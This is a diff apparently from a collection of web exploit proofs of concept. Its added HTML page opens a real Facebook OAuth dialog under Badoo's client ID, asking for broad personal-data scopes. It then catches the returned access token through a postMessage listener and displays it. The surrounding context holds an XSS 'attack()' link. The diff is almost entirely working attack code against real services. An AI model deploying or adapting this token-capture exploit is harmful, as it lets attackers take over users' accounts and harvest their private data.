@@ -53,4 +53,28 @@ function xss() {
 </script>
 <a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
 
+###########################################
 
+<!DOCTYPE>
+<html>
+  <head>
+  </head>
+  <body>
+    <div id="message">
+    </div>
+    <a href="#" onclick="window.open('https://www.facebook.com/v2.0/dialog/oauth?redirect_uri=https%3A%2F%2Fmus1.badoo.com%2Fcb.html%3Fflow%3Dauth%26provider%3D1&scope=public_profile%2Cemail%2Cuser_friends%2Cuser_photos%2Cuser_work_history%2Cuser_education_history%2Cuser_location%2Cuser_birthday%2Cuser_likes&response_type=token&auth_type=rerequest&client_id=107433747809&_rdr')">
+      Click Here
+    </a>
+    <script>
+    function listener(event) {
+      document.getElementById("message").innerHTML = "Your token for Facebook is "+ event.data.token;
+    }
+    if (window.addEventListener){
+      addEventListener("message", listener, false);
+    } else {
+      attachEvent("onmessage", listener);
+    }
+    </script>
+  </body>
+</html>
+#############################################
